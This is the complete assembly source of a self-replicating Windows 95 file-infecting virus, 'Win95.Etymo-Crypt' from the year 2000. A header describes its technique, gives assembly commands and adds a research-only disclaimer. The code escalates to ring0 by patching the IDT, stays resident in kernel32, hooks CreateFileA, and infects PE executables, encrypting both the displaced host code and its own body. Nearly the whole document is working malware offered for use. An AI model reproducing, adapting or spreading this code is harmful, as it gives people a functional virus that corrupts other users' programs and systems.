; *************************************************************************
; ********************                                 ********************
; ********************        Win95.Etymo-Crypt        ********************
; ********************                by               ********************
; ********************            BLACK JACK           ********************
; ********************                                 ********************
; *************************************************************************

comment ~

NAME: Win95.Etymo-Crypt
AUTHOR: Black Jack [independant Austrian Win32asm virus coder]
CONTACT: Black_Jack_VX@hotmail.com | http://www.coderz.net/blackjack
TYPE: Win9x global ring3 resident parasitic PE infector
SIZE: 1308 bytes

DESCRIPTION: When an infected file is run, the virus gets control. It gains
             ring0 by the standart IDT modifying trick. But it doesn't stay
             resident in ring0 (hooking VxD calls), but it just uses its
             ring0 privilege to write to the write-protected kernel32 memory:
             it copies itself into a gap in kernel32 in memory (between
             the header and the start of the first section, like nigr0's
             Win95.K32 virus) and hooks the CreateFileA API.
             Whenever the virus intercepts a file open now, it checks if
             the opened file is an infectable, uninfected PE EXE and infects
             it if all is ok. The infection process is a bit unusual: The
             virus creates a new section called ".vdata" (with standart data
             section attributes) and saves there the code from the entrypoint,
             after it has been encrypted against the virusbody. Then the
             entrypoint is overwritten with virus code, most of it encrypted
             again. The attributes of the code section are not modified, the
             virus doesn't need the write attribute set, because it only
             modifies its data when it is in ring0. The pro of this infection
             method is that there are no sections with unusual attributes.

KNOWN BUGS: Since the virus needs to be resident to  restore control to the
            host, there is no need for checking the OS or preventing errors
            with SEH, because infected files will crash under WinNT anyways,
            there's no way to prevent that.
            Because of that unbound import stuff, the virus only catches
            very few file opens. In a kernel32.dll infector this would be
            easy to prevent by changing the timedate stamp of kernel32.dll.
            In this case this doesn't work, because the system checks this
            stamp after the kernel32 has been loaded into memory and will
            give error messages if it has been changed each times the user
            tries to start a program. Another possible solution, patching
            the entry point of the hooked API with the JMP_virus instruction,
            like nigr0 and Bumblebee do, won't work too, because with my
            residency method the kernel memory stays write protected. And so
            this virus is a slow infector, but it still catches enough file
            opens to replicate successfully.

ASSEMBLE WITH:
                tasm32 /mx /m etymo.asm
                tlink32 /Tpe /aa etymo.obj,,, import32.lib

                there's no need for PEWRSEC or a similar tool, because the
                virus code is supposed to run in a read-only section anyways.

DISCLAIMER: I do *NOT* support the spreading of viruses in the wild.
            Therefore, this source was only written for research and
            education. Please do not spread it. The author can't be hold
            responsible for what you decide to do with this source.

PS: Greetings go to Gilgalad for the name of this virus!

~
; ===========================================================================


virussize       EQU     (virus_end - virus_start)
workspace       EQU     10000


Extrn MessageBoxA:Proc                          ; only for 1st gen
Extrn ExitProcess:Proc

386p
model flat

; First generation code is in the data section:

data
start:
        push 0                                  ; show stupid messagebox
        push offset caption
        push offset message
        push 0
        call MessageBoxA

        JMP virus_start

quit_1st_gen:
                                                ; quit program
        push 0                                  ; exit code
        push 0                                  ; ret address of call
        push offset ExitProcess                 ; can't do a real call,
        RET                                     ; because this code is moved

caption db "Black Jack strikes again...", 0
message db "Press OK to run the Win95.Etymo-Crypt virus", 0

skip_decryption_1st_gen:
        mov esi, offset new_bytes               ; skip the decryption in the
        mov edi, offset jmp_skip_decryption_1st_gen     ; first generation
        movsb
        movsd
        JMP over_encryption

new_bytes:
        mov ecx, ((virus_end - encrypted)/4)


; Virus body is in the code section:

code
virus_start:

; We have to access the section with the original host code from ring3 first,
; because if we access it first from ring0, it is not mapped yet and the
; virus will cause an exception. besides, the first dword of the encrypted
; host code is also the key for the virus decryption.

        db 0A1h                                 ; mov eax, [imm32]
org_host_code_VA dd offset quit_1st_gen

        call next                               ; go to ring0 calling routine

; ----- FIRST PART OF RING0 CODE --------------------------------------------
r0proc:
        pop ebp                                 ; offset of end_next label
        sub ebp, (end_next - virus_start)       ; EBP=delta offset
        push ebp                                ; is also true offset of
                                                ; virus start in memory,
                                                ; where we will return to

        mov dword ptr [edx+5*8], esi            ; restore interrupt
        mov dword ptr [edx+5*8+4], edi          ; descriptor


        lea edi, [ebp+virus_end-virus_start]    ; EDI=end of virus in memory

jmp_skip_decryption_1st_gen:
        JMP skip_decryption_1st_gen             ; skip decryption in first
                                                ; generation. will be
                                                ; replaced with:
        ; mov ecx, ((virus_end - encrypted)/4)


decrypt_virus_body:
        dec edi                                 ; go to previous dword
        dec edi
        dec edi
        dec edi

        xor dword ptr [edi], eax                ; decrypt one dword
        mov eax, dword ptr [edi]                ; decrypted dword is new key
        LOOP decrypt_virus_body                 ; loop until all is decrypted

        JMP encrypted                           ; jump to code that was just
                                                ; decrypted.

; ----- JUMP TO RING0 -------------------------------------------------------
next:
        push edx                                ; reserve room on stack
        sidt [esp-2]                            ; get IDT address
        pop edx                                 ; EDX=IDT address

        mov esi, dword ptr [edx+5*8]            ; save old interrupt
        mov edi, dword ptr [edx+5*8+4]          ; descriptor to EDI:ESI

        pop ebx                                 ; get address of ring0 proc

        mov word ptr [edx+5*8], bx              ; write offset of our ring0
        shr ebx, 16                             ; procedure into interrupt
        mov word ptr [edx+5*8+6], bx            ; descriptor

        int 5                                   ; call our ring0 code!
end_next:
                                                ; no IRET to here.

; ----- MAIN ENCRYPTED RING0 CODE -------------------------------------------
encrypted:

; now we decrypt the original start code of the host, which has been
; encrypted against the virus body.

        mov esi, ebp                            ; ESI=start of virus body
        mov edi, [ebp + (org_host_code_VA-virus_start)]  ; start of host code
        xor ecx, ecx                            ; ECX=0

decrypt_loop:
        lodsb
        sub byte ptr [edi+ecx], al
        inc ecx

        lodsb
        xor byte ptr [edi+ecx], al
        inc ecx

        lodsb
        add byte ptr [edi+ecx], al
        inc ecx

        lodsb
        xor byte ptr [edi+ecx], al
        inc ecx

        cmp ecx, virussize                      ; all decrypted?
        JB decrypt_loop                         ; loop until all is done

over_encryption:

; the kernel32 address is hardcoded, because this is virus is only Win95
; compatible anyways

        mov eax, 0BFF70000h                     ; EAX=kernel32 offset
        mov ebx, eax                            ; EBX=EAX
        add ebx, [eax+3Ch]                      ; EBX=PE header VA

        mov edi, [ebx+54h]                      ; header size
        add edi, eax                            ; EDI=virus VA
        cmp byte ptr [edi], 0A1h                ; "mov eax, imm32" opcode is
        JE already_resident                     ; residency marker
        push edi                                ; save virus VA in kernel32

; ----- SEARCH API ADDRESSES ------------------------------------------------
        mov edx, [ebx+78h]                      ; EDX=export directory RVA
        add edx, eax                            ; EDX=export directory VA
        lea esi, [ebp + (names_RVA_table - virus_start)]  ; array with ptrs
                                                          ; to API names
        lea edi, [ebp + (API_RVAs - virus_start)]       ; where to store the
                                                        ; API adresses

find_API:
        xor ecx, ecx                            ; ECX=0 (API names counter)

search_loop:
        pusha                                   ; save all registers
        push eax                                ; save EAX (kernel32 offset)
        lodsd                                   ; get offset of API name
        or eax, eax                             ; all done?
        JZ all_found
        add eax, ebp                            ; fixup with delta offset
        xchg eax, esi                           ; ESI=VA of a needed API name
        pop eax                                 ; restore EAX (kernel32 offs)
        mov edi, [edx+20h]                      ; EDI=AddressOfNames RVA
        add edi, eax                            ; EDI=AddressOfNames VA
        mov edi, [edi+ecx*4]                    ; EDI=RVA of API Name
        add edi, eax                            ; EDI=VA of API Name

cmp_loop:
        lodsb                                   ; get char from our API name
        scasb                                   ; equal to the one in k32 ?
        JNE search_on_API                       ; if not,try next exported API
        or al, al                               ; end of name?
        JZ found_API                            ; we've found an needed API!
        JMP cmp_loop                            ; go on with name compare

search_on_API:
        popa                                    ; restore all registers
        inc ecx                                 ; try next API in exports
        JMP search_loop                         ; go on

found_API:
        popa                                    ; restore all registers
        shl ecx, 1                              ; ECX=ECX*2 (index ordinals)
        add ecx, [edx+24h]                      ; AddressOfOrdinals RVA
        movzx ecx, word ptr [ecx+eax]           ; ECX=API Ordinal
        shl ecx, 2                              ; ECX=ECX*4
        add ecx, [edx+1Ch]                      ; AddressOfFunctions RVA
        add ecx, eax                            ; ECX=VA of API RVA
        mov dword ptr [ebp+(hook_API-virus_start)], ecx  ; save it
        mov ecx, [ecx]                          ; ECX=API RVA
        push eax                                ; save EAX (kernel32 base)
        add eax, ecx                            ; EAX=API VA!
        stosd                                   ; store it!
        lodsd                                   ; do the next API (add esi,4)
        pop eax                                 ; restore EAX (kernel32 base)
        JMP find_API                            ; do next API.

all_found:
        pop eax                                 ; remove EAX from stack
        popa                                    ; restore all registers

                                                ; last found API is hooked
        mov ecx, [ebp+(hook_API-virus_start)]   ; ECX=VA of API RVA
        mov edx, [ebx+54h]                      ; kernel32 header size
                                                ; (virus RVA in kernel32)
        add edx, (hook - virus_start)           ; RVA virus hook in kernel32
        mov [ecx], edx                          ; hook API!


        pop edi                                 ; restore EDI:virus VA in k32
        mov esi, ebp                            ; ESI=start of virus in mem
        mov ecx, virussize                      ; ECX=virussize
        cld                                     ; clear directory flag
        rep movsb                               ; move virus to TSR location!
        sub edi, (virus_end - go_on_r0)         ; EDI=offset go_on_r0 in k32
        JMP restore_host                        ; restore host

already_resident:
        add edi, (go_on_r0 - virus_start)       ; EDI=offset go_on_r0 in k32

restore_host:
        mov esi, [ebp + (org_host_code_VA - virus_start)]  ; ESI=offset
                                                ; of original host code
        JMP edi                                 ; go to go_on_r0 in kernel32


go_on_r0:
        mov edi, ebp                            ; EDI=virus/host entrypoint
        mov ecx, virussize                      ; ECX=virussize
        cld                                     ; clear directory flag
        rep movsb                               ; move host code back!
        iretd                                   ; go to original entry point
                                                ; in ring3!

; ----- TSR VIRUS HOOK OF CreateFileA ---------------------------------------
hook:
        push eax                                ; reserve room on stack for
                                                ; return address
        pushf                                   ; save flags
        pusha                                   ; save all registers

        call TSR_next                           ; get delta offset
TSR_next:
        pop ebp
        sub ebp, offset TSR_next

        mov eax, [ebp+offset CreateFileA]       ; address of original routine
        mov [esp+9*4], eax                      ; set return address
        mov esi, [esp+11*4]                     ; get address of filename

        push esi                                ; save it
search_ext:
        lodsb                                   ; get a byte from filename
        or al, al                               ; end of filename?
        JNZ search_ext                          ; search on
        mov eax, [esi-4]                        ; get extension in AX
        pop esi                                 ; restore filename ptr in ESI
        or eax, 00202020h                       ; make lowercase
        cmp eax, "exe"                          ; is it an EXE file?
        JNE exit_hook                           ; if not, then exit

        push esi                                ; offset filename
        call [ebp+offset GetFileAttributesA]    ; get file attribtes
        inc eax                                 ; -1 means error
        JZ exit_hook
        dec eax

        push eax                                ; save attributes and
        push esi                                ; filename ptr so we can
                                                ; restore the attribs later

        push 80h                                ; normal attributes
        push esi
        call [ebp+offset SetFileAttributesA]    ; reset file attributes
        or eax, eax                             ; 0 means error
        JZ reset_attributes

        push 0                                  ; template file (shit)
        push 80h                                ; file attributes (normal)
        push 3                                  ; open existing
        push 0                                  ; security attributes (shit)
        push 0                                  ; do not share file
        push 0C0000000h                         ; read/write mode
        push esi                                ; pointer to filename
        call [ebp+offset CreateFileA]           ; OPEN FILE.
        inc eax                                 ; EAX= -1 (Invalid handle)
        JZ reset_attributes
        dec eax
        push eax                                ; save filehandle
        xchg edi, eax                           ; EDI=filehandle

        sub esp, 3*8                            ; reserve space on stack
                                                ; to store the filetimes

        mov ebx, esp                            ; get the filetimes to the
        push ebx                                ; reserved place on stack
        add ebx, 8
        push ebx
        add ebx, 8
        push ebx
        push edi                                ; filehandle
        call [ebp+offset GetFileTime]           ; get the filetimes
        or eax, eax                             ; error?
        JZ closefile

        push 0                                  ; high file_size dword ptr
        push edi
        call [ebp+offset GetFileSize]           ; get the filesize to EAX
        inc eax                                 ; -1 means error
        JZ closefile
        dec eax

        mov ebx, esp                            ; save addresses of filetimes
        push ebx                                ; for the API call to restore
        add ebx, 8                              ; them later
        push ebx
        add ebx, 8
        push ebx
        push edi

        push edi                                ; filehandle for SetEndofFile

                                                ; for the SetFilePointer at
                                                ; the end to truncate file
        push 0                                  ; move relative to filestart
        push 0                                  ; high word of file pointer
        push eax                                ; filesize
        push edi                                ; filehandle

        add eax, workspace
        push 0                                  ; name file mapping obj (shit)
        push eax                                ; low dword of file_size
        push 0                                  ; high dword of file_size
        push 4                                  ; PAGE_READWRITE
        push 0                                  ; security attributes (shit)
        push edi
        call [ebp+offset CreateFileMappingA]
        or eax, eax                             ; error happened?
        JZ error_createfilemapping

        push eax                                ; save maphandle for
                                                ; CloseHandle

        push 0                                  ; map the whole file
        push 0                                  ; low dword of fileoffset
        push 0                                  ; high dword of fileoffset
        push 2                                  ; read/write access
        push eax                                ; maphandle
        call [ebp+offset MapViewOfFile]
        or eax, eax
        JZ closemaphandle

        push eax                                ; save mapbase for
                                                ; UnmapViewOfFile

        cmp word ptr [eax], "ZM"                ; exe file?
        JNE closemap                            ; if not, then exit

        cmp word ptr [eax+18h], 40h             ; new executable header?
        JNE closemap                            ; if not, then exit

        add eax, [eax+3Ch]                      ; EBX=new header address
        cmp dword ptr [eax], "EP"               ; PE file?
        JNE closemap                            ; if not, then exit

        test word ptr [eax+16h], 0010000000000000b   ; DLL ?
        JNZ closemap                            ; if yes, then exit

        movzx ecx, word ptr [eax+14h]           ; SizeOfOptionalHeader
        mov ebx, eax                            ; EBX=offset PE header
        add ebx, 18h                            ; SizeOfNTHeader
        add ebx, ecx                            ; EBX=first section header
        push ebx                                ; save it

find_code_section:
        mov ecx, [eax+28h]                      ; ECX=EntryRVA
        sub ecx, [ebx+0Ch]                      ; Virtualaddress of section
        sub ecx, [ebx+10h]                      ; SizeOfRawData
        JB found_code_section                   ; we found the code section!
        add ebx, 40                             ; next section
        JMP find_code_section                   ; search on

found_code_section:
        mov edx, [eax+28h]                      ; EDX=EntryRVA
        sub edx, [ebx+0Ch]                      ; Virtualaddress
        add edx, [ebx+14h]                      ; AddressOfRawData
                                                ; EDX=RAW ptr to entrypoint

        pop ebx                                 ; EBX=first section header

        cmp ecx, -virussize                     ; enough room left in the
        JG closemap                             ; section for the virus body?

        mov ecx, [esp]                          ; ECX=mapbase
        add ecx, edx                            ; ECX=entrypoint in Filemap

        cmp byte ptr [ecx], 0A1h                ; already infected ?
        JE closemap                             ; if so, then exit

        push edx                                ; save RAW entrypoint address

        movzx edx, word ptr [eax+6]             ; NumberOfSections
        dec edx
        imul edx, edx, 40
        add ebx, edx                            ; EBX=last section header

        inc word ptr [eax+6]                    ; increase NumberOfSections

        mov dword ptr [ebx+40+00h], "adv."      ; name ".vdata"
        mov dword ptr [ebx+40+04h], "at"
        mov dword ptr [ebx+40+08h], virussize   ; Virtualsize

        mov edx, [ebx+0Ch]                      ; VirtualAddress
        add edx, [ebx+08h]                      ; VirtualSize
        mov ecx, [eax+38h]                      ; SectionAlign
        call align_EDX

        mov dword ptr [ebx+40+0Ch], edx         ; VirtualAddress

        add edx, virussize                      ; new ImageSize
        call align_EDX                          ; align to SectionAlign

        mov dword ptr [eax+50h], edx            ; store new ImageSize

        mov edx, virussize
        mov ecx, [eax+3Ch]                      ; FileAlign
        call align_EDX                          ; align virsize to FileAlign

        mov dword ptr [ebx+40+10h], edx         ; store new SizeOfRawData

        mov edx, [ebx+14h]                      ; PointerToRawData
        add edx, [ebx+10h]                      ; SizeOfRawData
        call align_EDX                          ; align new section
                                                ; raw offset to FileAlign

        mov dword ptr [ebx+40+14h], edx         ; store new PointerToRawData

        add edx, [ebx+40+10h]                   ; SizeOfRawData
        mov dword ptr [esp+4*4], edx            ; new filesize

        mov dword ptr [ebx+40+18h], 0           ; Relocation shit
        mov dword ptr [ebx+40+1Ch], 0
        mov dword ptr [ebx+40+20h], 0
        mov dword ptr [ebx+40+24h], 0C0000040h  ; flags: [IWR], this is the
                                                ; standart for data sections

        mov edx, dword ptr [ebx+40+0Ch]         ; RVA host code
        add edx, [eax+34h]                      ; add ImageBase to get VA

        pop esi                                 ; ESI=RAW entrypoint address
        pop eax                                 ; EAX=mapbase
        push eax                                ; we still need it on stack
        add esi, eax                            ; ESI=entrypoint in FileMap
        push esi                                ; save it on stack
        mov edi, dword ptr [ebx+40+14h]         ; PointerToRawData
        add edi, eax                            ; start of new section in map
        mov ecx, virussize                      ; bytes to move
        push ecx                                ; save virussize on stack
        cld
        mov eax, edi                            ; EAX=new section in FileMap
        rep movsb                               ; of entry point code to
                                                ; newly created section

        pop ecx                                 ; ECX=virussize
        pop edi                                 ; EDI=entrypoint in Filemap
        lea esi, [ebp + offset virus_start]     ; ESI=virusstart in memory
        rep movsb                               ; move virus body to
                                                ; original Entrypoint of File

        mov [edi - (virus_end-org_host_code_VA)], edx   ; store RVA of
                                                ; original host start code

        push edi                                ; Save end of virus body
                                                ; in Filemap

        mov esi, edi                            ; ESI=virus end in Filemap
        sub esi, virussize                      ; ESI=virus start in Filemap
        xchg edi, eax                           ; EDI=start of new section

; Encrypt the code from the original entry point against the virus body.

encrypt_loop:
        lodsb
        add byte ptr [edi+ecx], al
        inc ecx

        lodsb
        xor byte ptr [edi+ecx], al
        inc ecx

        lodsb
        sub byte ptr [edi+ecx], al
        inc ecx

        lodsb
        xor byte ptr [edi+ecx], al
        inc ecx

        cmp ecx, virussize                      ; all encrypted?
        JB encrypt_loop                         ; if not, then crypt on


; and now the main part of the virus body is encrypted itself. It is crypted
; from the end of the virus body upwards, for each dword is the next dword
; used as crypt key. The first key is the first dword of the encrypted
; host code.

        mov ecx, ((virus_end - encrypted)/4)    ; size to crypt in dwords
        mov eax, dword ptr [edi]                ; initial key
        pop edi                                 ; end of virus in filemap

encrypt_virus_body:
        dec edi                                 ; go to previous dword
        dec edi
        dec edi
        dec edi

        mov ebx, dword ptr [edi]                ; this dword is the next key
        xor dword ptr [edi], eax                ; encrypt it with this key
        xchg ebx, eax                           ; change keys
        LOOP encrypt_virus_body                 ; LOOP until encryption done


; the parameters for the following API calls have already been pushed on the
; stack while the opening process of the file

closemap:
        call [ebp+offset UnmapViewOfFile]       ; unmap file

closemaphandle:
        call [ebp+offset CloseHandle]           ; close map handle

error_createfilemapping:
        call [ebp+offset SetFilePointer]        ; set file pointer to EOF

        call [ebp+offset SetEndOfFile]          ; truncate file here

        call [ebp+offset SetFileTime]           ; restore filetimes

closefile:
        add esp, 8*3                            ; remove filetimes from stack

        call [ebp+offset CloseHandle]           ; close file

reset_attributes:
        call [ebp+offset SetFileAttributesA]    ; reset attributes

exit_hook:
        popa                                    ; restore all registers
        popf                                    ; restore flags
        ret                                     ; go to original API routine

; ----- ALIGN SUBROUTINE ----------------------------------------------------
; aligns EDX to ECX
align_EDX:
        push eax                                ; save EAX
        push edx                                ; save EDX
        xchg eax, edx                           ; EAX=value to align
        xor edx, edx                            ; EDX=0
        div ecx                                 ; divide EDX:EAX by ECX
        pop eax                                 ; restore old EDX in EAX
        or edx, edx                             ; EDX=mod of division
        JZ already_aligned                      ; already aligned?
        add eax, ecx                            ; if not align
        sub eax, edx                            ; EDX=mod
already_aligned:
        xchg eax, edx                           ; EDX=aligned value
        pop eax                                 ; restore EAX
        ret


db "[Win95.Etymo-Crypt] by Black Jack", 0
db "This virus was written in Austria in May/June/July 2000", 0

names_RVA_table:
dd (n_GetFileAttributesA - virus_start)
dd (n_SetFileAttributesA - virus_start)
dd (n_GetFileTime - virus_start)
dd (n_GetFileSize - virus_start)
dd (n_CreateFileMappingA - virus_start)
dd (n_MapViewOfFile - virus_start)
dd (n_UnmapViewOfFile - virus_start)
dd (n_SetFilePointer - virus_start)
dd (n_SetEndOfFile - virus_start)
dd (n_CloseHandle - virus_start)
dd (n_SetFileTime - virus_start)
dd (n_CreateFileA - virus_start)
dd 0

n_GetFileAttributesA    db "GetFileAttributesA", 0
n_SetFileAttributesA    db "SetFileAttributesA", 0
n_GetFileTime           db "GetFileTime", 0
n_GetFileSize           db "GetFileSize", 0
n_CreateFileMappingA    db "CreateFileMappingA", 0
n_MapViewOfFile         db "MapViewOfFile", 0
n_UnmapViewOfFile       db "UnmapViewOfFile", 0
n_SetFilePointer        db "SetFilePointer", 0
n_SetEndOfFile          db "SetEndOfFile", 0
n_CloseHandle           db "CloseHandle", 0
n_SetFileTime           db "SetFileTime", 0
n_CreateFileA           db "CreateFileA", 0

API_RVAs:
GetFileAttributesA      dd ?
SetFileAttributesA      dd ?
GetFileTime             dd ?
GetFileSize             dd ?
CreateFileMappingA      dd ?
MapViewOfFile           dd ?
UnmapViewOfFile         dd ?
SetFilePointer          dd ?
SetEndOfFile            dd ?
CloseHandle             dd ?
SetFileTime             dd ?
CreateFileA             dd ?

hook_API                dd ?

if ((($-virus_start) mod 4) NE 0)               ; align virussize to dwords
        db (4-(($-virus_start) mod 4)) dup(0)
endif

virus_end:

end start